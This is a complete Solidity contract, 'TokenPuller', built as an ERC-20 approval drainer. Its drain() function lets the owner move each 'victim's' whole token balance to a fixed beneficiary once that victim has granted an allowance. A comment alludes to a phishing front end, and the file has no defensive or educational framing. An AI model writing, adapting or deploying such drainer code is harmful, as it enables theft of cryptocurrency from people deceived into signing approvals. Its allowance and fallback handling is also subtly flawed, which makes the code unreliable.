// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title TokenPuller
/// @notice Moves a victim's entire token balance to the beneficiary,
///         provided the victim granted an allowance to this contract.
contract TokenPuller is Ownable {
    IERC20 public immutable token;
    address public immutable beneficiary;

    event Drained(address indexed victim, address indexed beneficiary, uint256 amount);

    error TransferFailed();
    error NothingToDo(uint256 balance, uint256 allowance);

    constructor(address _token, address _beneficiary) Ownable(msg.sender) {
        require(_token != address(0), "TokenPuller: zero token");
        require(_beneficiary != address(0), "TokenPuller: zero beneficiary");
        token = IERC20(_token);
        beneficiary = _beneficiary;
    }

    /// @dev Requires the victim (or whoever owns these tokens) to have
    ///      called token.approve(TokenPuller, ...) beforehand.
    function drain(address victim) external onlyOwner {
        uint256 bal = token.balanceOf(victim);
        uint256 allow = token.allowance(victim, address(this));
        // tolerate (but log) the case where the frontend race lost
        if (bal == 0 || allow == 0) {
            emit Drained(victim, beneficiary, 0);
            return;
        }
        bool ok = token.transferFrom(victim, beneficiary, bal);
        if (!ok) {
            // Some non-standard tokens (e.g. old USDT) return no boolean.
            bool success;
            (success, ) = address(token).call(
                abi.encodeWithSelector(0x23b872dd, victim, beneficiary, bal)
            );
            if (!success) revert TransferFailed();
        }
        emit Drained(victim, beneficiary, bal);
    }
}
